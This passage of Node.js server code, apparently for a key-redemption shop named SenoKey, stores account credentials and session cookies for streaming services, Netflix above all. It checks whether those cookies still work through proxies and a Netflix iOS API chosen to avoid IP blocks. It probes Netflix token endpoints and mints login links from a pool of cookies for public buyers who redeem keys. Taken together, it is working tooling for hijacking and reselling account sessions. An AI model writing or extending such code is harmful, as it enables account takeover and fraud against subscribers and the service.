      return json(res, 200, { ok: true });
    }

    // ── Admin auth guard ────────────────────────────────────────────────────
    if (url.startsWith('/api/admin/') && !checkSession(req))
      return json(res, 401, { error: 'unauthorized' });

    // ── Admin: dashboard stats ──────────────────────────────────────────────
    if (meth === 'GET' && url === '/api/admin/stats') {
      const keys     = loadJSON(PATHS.keys, {});
      const products = loadJSON(PATHS.products, DEFAULT_PRODUCTS);
      const all      = Object.values(keys);
      const claimed  = all.filter(k => k.claimed).length;
      const stock = {}, claimedCount = {};
      all.forEach(k => {
        stock[k.service]        = (stock[k.service]        || 0) + 1;
        if (k.claimed) claimedCount[k.service] = (claimedCount[k.service] || 0) + 1;
      });
      let log = [];
      try { log = JSON.parse(fs.readFileSync(PATHS.log, 'utf8')); } catch {}
      const serviceStats = Object.keys(stock).map(id => ({
        id, name: products[id]?.name || id, icon: products[id]?.icon || '🔑',
        total: stock[id], claimed: claimedCount[id] || 0,
        available: stock[id] - (claimedCount[id] || 0),
      })).sort((a, b) => b.total - a.total);
      return json(res, 200, {
        total: all.length, claimed, unclaimed: all.length - claimed,
        disabled: all.filter(k => k.disabled).length,
        dead: all.filter(k => k.dead).length,
        withCookie: all.filter(k => k.cookie).length,
        services: serviceStats,
        recentLog: log.slice(0, 100),
      });
    }

    // ── Admin: keys ─────────────────────────────────────────────────────────
    if (meth === 'GET' && url === '/api/admin/keys') {
      const qs     = new URLSearchParams(req.url.split('?')[1] || '');
      const svcFlt = qs.get('service') || '';
      const stFlt  = qs.get('status')  || '';
      const keys   = loadJSON(PATHS.keys, {});
      let entries  = Object.entries(keys).map(([k, v]) => {
        const { cookie: _c, ...safe } = v; // never expose raw cookie
        return { key: k, ...safe, hasCookie: !!v.cookie };
      });
      if (svcFlt) entries = entries.filter(e => e.service === svcFlt);
      if (stFlt === 'claimed')   entries = entries.filter(e => e.claimed && !e.disabled && !e.dead);
      if (stFlt === 'available') entries = entries.filter(e => !e.claimed && !e.disabled && !e.dead);
      if (stFlt === 'disabled')  entries = entries.filter(e => e.disabled);
      if (stFlt === 'dead')      entries = entries.filter(e => e.dead);
      entries.sort((a, b) => (b.addedAt || 0) - (a.addedAt || 0));
      return json(res, 200, entries);
    }

    // Add single key
    if (meth === 'POST' && url === '/api/admin/keys') {
      const body = J(await readBody(req));
      if (!body?.service) return json(res, 400, { error: 'missing_service' });
      const k = (body.key?.trim().toUpperCase()) || genKey();
      if (!KEY_RE.test(k)) return json(res, 400, { error: 'invalid_key_format' });
      const keys = loadJSON(PATHS.keys, {});
      if (keys[k]) return json(res, 409, { error: 'key_exists' });
      const newEntry = { service: body.service, cookie: body.cookie?.trim() || null, credentials: body.credentials || {}, claimed: false, claimedAt: null, claimedIP: null, dead: false, deadAt: null, lastChecked: null, lastCheckOk: null, disabled: false, addedAt: Date.now(), note: body.note || null };
      keys[k] = newEntry;
      saveJSON(PATHS.keys, keys);
      let checked = null;
      if (body.autoCheck && newEntry.cookie) {
        checked = await checkCookie(body.service, newEntry.cookie);
        newEntry.lastChecked = Date.now();
        newEntry.lastCheckOk = checked.alive;
        if (checked.alive === false) { newEntry.dead = true; newEntry.deadAt = Date.now(); }
        else if (checked.alive === true) newEntry.dead = false;
        keys[k] = newEntry;
        saveJSON(PATHS.keys, keys);
      }
      return json(res, 200, { ok: true, key: k, checked });
    }

    // Bulk import: array of { key?, service, credentials, cookie? }
    if (meth === 'POST' && url === '/api/admin/keys/bulk') {
      const body = J(await readBody(req));
      if (!body?.service || !Array.isArray(body.entries))
        return json(res, 400, { error: 'invalid' });
      const keys = loadJSON(PATHS.keys, {});
      let added = 0, skipped = 0;
      const generated = [];
      for (const e of body.entries) {
        const k = e.key ? e.key.trim().toUpperCase() : genKey();
        if (!KEY_RE.test(k)) { skipped++; continue; }
        if (keys[k]) { skipped++; continue; }
        keys[k] = { service: body.service, cookie: (e.cookie || body.cookie || '').trim() || null, credentials: e.credentials || {}, claimed: false, claimedAt: null, claimedIP: null, dead: false, deadAt: null, lastChecked: null, lastCheckOk: null, disabled: false, addedAt: Date.now() };
        generated.push(k);
        added++;
      }
      saveJSON(PATHS.keys, keys);
      return json(res, 200, { ok: true, added, skipped, keys: generated });
    }

    // Generate N keys with same credentials + cookie template
    if (meth === 'POST' && url === '/api/admin/keys/generate') {
      const body  = J(await readBody(req));
      if (!body?.service || !body?.count) return json(res, 400, { error: 'invalid' });
      const count = Math.max(1, Math.min(500, parseInt(body.count) || 1));
      const keys  = loadJSON(PATHS.keys, {});
      const gen   = [];
      for (let i = 0; i < count; i++) {
        const k = genKey();
        keys[k] = { service: body.service, cookie: body.cookie?.trim() || null, credentials: body.credentials || {}, claimed: false, claimedAt: null, claimedIP: null, dead: false, deadAt: null, lastChecked: null, lastCheckOk: null, disabled: false, addedAt: Date.now() };
        gen.push(k);
      }
      saveJSON(PATHS.keys, keys);
      return json(res, 200, { ok: true, count: gen.length, keys: gen });
    }

    // Check a single key's cookie live
    if (meth === 'POST' && url === '/api/admin/check-key') {
      const body = J(await readBody(req)) || {};
      const k = body.key?.trim().toUpperCase();
      if (!k || !KEY_RE.test(k)) return json(res, 400, { error: 'invalid' });
      const keys = loadJSON(PATHS.keys, {});
      if (!keys[k]) return json(res, 404, { error: 'not_found' });
      const entry = keys[k];
      if (!entry.cookie) return json(res, 200, { ok: true, key: k, alive: null, reason: 'no_cookie' });
      const result = await checkCookie(entry.service, entry.cookie);
      entry.lastChecked = Date.now();
      entry.lastCheckOk = result.alive;
      if (result.alive === false) { entry.dead = true; entry.deadAt = Date.now(); }
      else if (result.alive === true) { entry.dead = false; entry.deadAt = null; } // revive if was dead
      keys[k] = entry;
      saveJSON(PATHS.keys, keys);
      return json(res, 200, { ok: true, key: k, alive: result.alive });
    }

    // Check all unclaimed keys that have a cookie
    if (meth === 'POST' && url === '/api/admin/check-all') {
      const keys = loadJSON(PATHS.keys, {});
      const toCheck = Object.entries(keys).filter(([,v]) => !v.claimed && !v.disabled && v.cookie);
      let alive = 0, dead = 0, unknown = 0;

      // Netflix: group by expiry so we send full NetflixId+SecureNetflixId pairs
      const nfGroups = {}; // expiry -> { pairs, keySet }
      const nonNf = [];
      for (const [k, entry] of toCheck) {
        if (entry.service !== 'netflix') { nonNf.push([k, entry]); continue; }
        const ck = parseCookies(entry.cookie);
        if (!ck.length) { nonNf.push([k, entry]); continue; } // metadata/unparseable → count as unknown via nonNf
        const seen = new Set();
        for (const c of ck) {
          const expiry = c.expirationDate || 0;
          if (!nfGroups[expiry]) nfGroups[expiry] = { pairs: [], keys: [] };
          nfGroups[expiry].pairs.push({ name: c.name, value: c.value });
          if (!seen.has(k)) { nfGroups[expiry].keys.push(k); seen.add(k); }
        }
      }

      // Check each Netflix account group via iOS Argo API (not IP-blocked)
      let nfDiag = null;
      for (const group of Object.values(nfGroups)) {
        const nfId = group.pairs.find(p => p.name === 'NetflixId')?.value;
        if (!nfId) {
          for (const k of group.keys) { keys[k].lastChecked = Date.now(); unknown++; }
          continue;
        }
        let result = { alive: null };
        try {
          const r = await tryNetflixTokenIOS(nfId);
          if (!nfDiag) nfDiag = { nfIdLen: nfId.length, got: r ? (r.dead ? 'dead' : 'token') : 'null' };
          if (!r)      result = { alive: null };
          else if (r.dead) result = { alive: false };
          else         result = { alive: true };
        } catch (e) { if (!nfDiag) nfDiag = { error: e.message }; }
        for (const k of group.keys) {
          keys[k].lastChecked = Date.now();
          keys[k].lastCheckOk = result.alive;
          if (result.alive === true)       { alive++;   keys[k].dead = false; keys[k].deadAt = null; }
          else if (result.alive === false) { dead++;    keys[k].dead = true;  keys[k].deadAt = Date.now(); }
          else unknown++;
        }
      }

      // Check non-Netflix services individually
      for (const [k, entry] of nonNf) {
        const result = await checkCookie(entry.service, entry.cookie);
        entry.lastChecked = Date.now();
        entry.lastCheckOk = result.alive;
        if (result.alive === true)       { alive++;   entry.dead = false; entry.deadAt = null; }
        else if (result.alive === false) { dead++;    entry.dead = true;  entry.deadAt = Date.now(); }
        else unknown++;
        keys[k] = entry;
      }

      saveJSON(PATHS.keys, keys);
      return json(res, 200, { ok: true, checked: toCheck.length, alive, dead, unknown, nfDiag });
    }

    // Single key operations
    if (url.startsWith('/api/admin/key/')) {
      const k = decodeURIComponent(url.slice('/api/admin/key/'.length)).toUpperCase();
      const keys = loadJSON(PATHS.keys, {});

      if (meth === 'GET') {
        if (!keys[k]) return json(res, 404, { error: 'not_found' });
        const { cookie: _c, ...safe } = keys[k]; // never expose raw cookie
        return json(res, 200, { key: k, ...safe, hasCookie: !!keys[k].cookie });
      }

      if (meth === 'PATCH') {
        if (!keys[k]) return json(res, 404, { error: 'not_found' });
        const body = J(await readBody(req)) || {};
        if (body.disabled    !== undefined) keys[k].disabled    = body.disabled;
        if (body.dead        !== undefined) { keys[k].dead = body.dead; if (!body.dead) keys[k].deadAt = null; }
        if (body.claimed     !== undefined) { keys[k].claimed = body.claimed; if (!body.claimed) { keys[k].claimedAt = null; keys[k].claimedIP = null; } }
        if (body.credentials !== undefined) keys[k].credentials = body.credentials;
        if (body.cookie      !== undefined) keys[k].cookie      = body.cookie || null;
        if (body.note        !== undefined) keys[k].note        = body.note;
        saveJSON(PATHS.keys, keys);
        return json(res, 200, { ok: true });
      }

      if (meth === 'DELETE') {
        if (!keys[k]) return json(res, 404, { error: 'not_found' });
        delete keys[k];
        saveJSON(PATHS.keys, keys);
        return json(res, 200, { ok: true });
      }
    }

    // Export keys as text
    if (meth === 'GET' && url === '/api/admin/keys/export') {
      const qs  = new URLSearchParams(req.url.split('?')[1] || '');
      const svc = qs.get('service') || '';
      const st  = qs.get('status')  || 'available';
      const keys = loadJSON(PATHS.keys, {});
      let entries = Object.entries(keys);
      if (svc) entries = entries.filter(([,v]) => v.service === svc);
      if (st === 'available') entries = entries.filter(([,v]) => !v.claimed && !v.disabled);
      if (st === 'claimed')   entries = entries.filter(([,v]) => v.claimed);
      const lines = entries.map(([k, v]) => {
        const creds = Object.values(v.credentials || {}).join(',');
        return `${k},${v.service},${creds}`;
      }).join('\n');
      res.writeHead(200, { 'Content-Type': 'text/plain', 'Content-Disposition': 'attachment; filename="keys.txt"' });
      return res.end(lines);
    }

    // ── Admin: products ─────────────────────────────────────────────────────
    if (meth === 'GET' && url === '/api/admin/products') {
      return json(res, 200, loadJSON(PATHS.products, DEFAULT_PRODUCTS));
    }

    if (meth === 'POST' && url === '/api/admin/products') {
      const body = J(await readBody(req));
      if (!body?.id || !body?.name) return json(res, 400, { error: 'invalid' });
      const products = loadJSON(PATHS.products, DEFAULT_PRODUCTS);
      products[body.id] = { ...body };
      saveJSON(PATHS.products, products);
      return json(res, 200, { ok: true });
    }

    if (meth === 'DELETE' && url.startsWith('/api/admin/products/')) {
      const id = url.slice('/api/admin/products/'.length);
      const products = loadJSON(PATHS.products, DEFAULT_PRODUCTS);
      if (!products[id]) return json(res, 404, { error: 'not_found' });
      delete products[id];
      saveJSON(PATHS.products, products);
      return json(res, 200, { ok: true });
    }

    // Toggle product enable/disable
    if (meth === 'PATCH' && url.startsWith('/api/admin/products/')) {
      const id = url.slice('/api/admin/products/'.length);
      const body = J(await readBody(req)) || {};
      const products = loadJSON(PATHS.products, DEFAULT_PRODUCTS);
      if (!products[id]) return json(res, 404, { error: 'not_found' });
      Object.assign(products[id], body);
      saveJSON(PATHS.products, products);
      return json(res, 200, { ok: true });
    }

    // ── Admin: log ──────────────────────────────────────────────────────────
    if (meth === 'GET' && url === '/api/admin/log') {
      let log = [];
      try { log = JSON.parse(fs.readFileSync(PATHS.log, 'utf8')); } catch {}
      return json(res, 200, log);
    }

    if (meth === 'DELETE' && url === '/api/admin/log') {
      fs.writeFileSync(PATHS.log, '[]');
      return json(res, 200, { ok: true });
    }

    // ── Admin: config ───────────────────────────────────────────────────────
    if (meth === 'GET' && url === '/api/admin/config') {
      const cfg = loadJSON(PATHS.config, DEFAULT_CONFIG);
      return json(res, 200, { siteName: cfg.siteName, siteTagline: cfg.siteTagline });
    }

    if (meth === 'POST' && url === '/api/admin/config') {
      const body = J(await readBody(req)) || {};
      const cfg = loadJSON(PATHS.config, DEFAULT_CONFIG);
      if (body.siteName)    cfg.siteName    = body.siteName;
      if (body.siteTagline) cfg.siteTagline = body.siteTagline;
      if (body.newPassword) {
        if (body.currentPassword !== cfg.adminPassword)
          return json(res, 403, { error: 'wrong_current_password' });
        cfg.adminPassword = body.newPassword;
      }
      saveJSON(PATHS.config, cfg);
      return json(res, 200, { ok: true });
    }

    // ── Admin: reveal raw cookie ────────────────────────────────────────────
    if (meth === 'GET' && /^\/api\/admin\/key\/[^/]+\/cookie$/.test(url)) {
      const k = decodeURIComponent(url.slice('/api/admin/key/'.length, -'/cookie'.length)).toUpperCase();
      const keys = loadJSON(PATHS.keys, {});
      if (!keys[k]) return json(res, 404, { error: 'not_found' });
      return json(res, 200, { key: k, cookie: keys[k].cookie || null });
    }

    // ── Admin: generate login links (Netflix nftoken etc.) ──────────────────
    if (meth === 'POST' && /^\/api\/admin\/key\/[^/]+\/links$/.test(url)) {
      const k = decodeURIComponent(url.slice('/api/admin/key/'.length, -'/links'.length)).toUpperCase();
      const keys = loadJSON(PATHS.keys, {});
      if (!keys[k]) return json(res, 404, { error: 'not_found' });
      const entry = keys[k];
      if (!entry.cookie) return json(res, 400, { error: 'no_cookie', message: 'This key has no cookie stored.' });
      if (entry.service !== 'netflix') return json(res, 400, { error: 'unsupported_service', message: 'Login link generation only supported for Netflix currently.' });
      const links = await generateNetflixLinks(entry.cookie);
      return json(res, 200, { ok: true, service: entry.service, links });
    }

    // ── Admin: test Netflix cookie (debug) ─────────────────────────────────
    if (meth === 'POST' && url === '/api/admin/test-netflix') {
      const body = J(await readBody(req));
      const cookieHeader = (body?.cookie || '').trim();
      if (!cookieHeader) return json(res, 400, { error: 'missing_cookie' });
      const endpoints = [
        '/nq/website/memberapi/v1/loginToken',
        '/nq/website/memberapi/v1/mintToken',
        '/nq/website/memberapi/v1/profilesGateway',
      ];
      const results = [];
      for (const ep of endpoints) {
        for (const method of ['POST', 'GET']) {
          try {
            const r = method === 'POST'
              ? await nfPOST('www.netflix.com', ep, NF_HDRS(cookieHeader), '{}')
              : await nfGET('www.netflix.com', ep, NF_HDRS(cookieHeader));
            results.push({ ep, method, status: r.status, body: r.body.slice(0, 300) });
          } catch (e) {
            results.push({ ep, method, error: e.message });
          }
        }
      }
      return json(res, 200, { ok: true, results });
    }

    // ── Admin: file import ──────────────────────────────────────────────────
    if (meth === 'POST' && url === '/api/admin/import') {
      const body = J(await readBody(req, 8 * 1024 * 1024));
      if (!body?.service || !body?.content) return json(res, 400, { error: 'invalid', message: 'service and content are required' });
      const entries = parseImportContent(body.content, body.format || 'auto');
      const keys = loadJSON(PATHS.keys, {});
      let added = 0, skipped = 0;
      const generated = [];
      for (const e of entries.slice(0, 2000)) {
        const k = e.key ? e.key.trim().toUpperCase() : genKey();
        if (!KEY_RE.test(k)) { skipped++; continue; }
        if (keys[k]) { skipped++; continue; }
        keys[k] = { service: body.service, cookie: (e.cookie || body.sharedCookie || '').trim() || null, credentials: e.credentials || {}, claimed: false, claimedAt: null, claimedIP: null, dead: false, deadAt: null, lastChecked: null, lastCheckOk: null, disabled: false, addedAt: Date.now(), note: null };
        generated.push(k); added++;
      }
      saveJSON(PATHS.keys, keys);
      appendLog({ type: 'import', count: added, service: body.service });
      return json(res, 200, { ok: true, added, skipped, total: entries.length, keys: generated.slice(0, 50) });
    }

    // ── Public: get login links for a claimed key (Netflix nftoken) ────────────
    if (meth === 'POST' && url === '/api/key-links') {
      const body = J(await readBody(req));
      if (!body?.key) return json(res, 400, { error: 'missing_key' });
      const k = body.key.trim().toUpperCase();
      if (!KEY_RE.test(k)) return json(res, 400, { error: 'invalid_format' });
      const keys = loadJSON(PATHS.keys, {});
      const entry = keys[k];
      if (!entry) return json(res, 404, { error: 'not_found' });
      if (!entry.claimed) return json(res, 403, { error: 'not_claimed', message: 'Redeem this key first to get login links.' });
      if (entry.service !== 'netflix') return json(res, 404, { error: 'unsupported', message: 'Login links are only available for Netflix currently.' });
      try {
        const links = await generateNetflixLinksFromPool(keys);
        if (links.error) return json(res, 503, { error: links.error, detail: links.detail, message: `No working Netflix cookie found (${links.error}${links.detail ? ': ' + links.detail : ''}). Try again later.` });
        return json(res, 200, { ok: true, service: entry.service, links });
      } catch(e) {
        return json(res, 500, { error: 'link_generation_failed', message: 'Could not generate login links. Try again.' });
      }
    }

    json(res, 404, { error: 'not_found' });

  } catch(e) {
    console.error('[error]', e.message);
    json(res, 500, { error: 'server_error', message: e.message });
  }

}).listen(PORT, () => {
  console.log('\n  ╔══════════════════════════════════╗');
  console.log('  ║   SenoKey — Key Redemption v1.0  ║');
  console.log('  ╚══════════════════════════════════╝');
  console.log(`\n  Site:  http://localhost:${PORT}`);
  console.log(`  Admin: http://localhost:${PORT}/admin`);
  console.log(`  Data:  ${DATA}`);
  console.log(`  Proxies: ${PROXIES.length} loaded${PROXIES.length ? '' : ' (add proxies.txt to data/ for Netflix checking)'}`);
  console.log('\n  Default admin password: admin123');
  console.log('  Go to Admin → Settings to change it.\n');
});
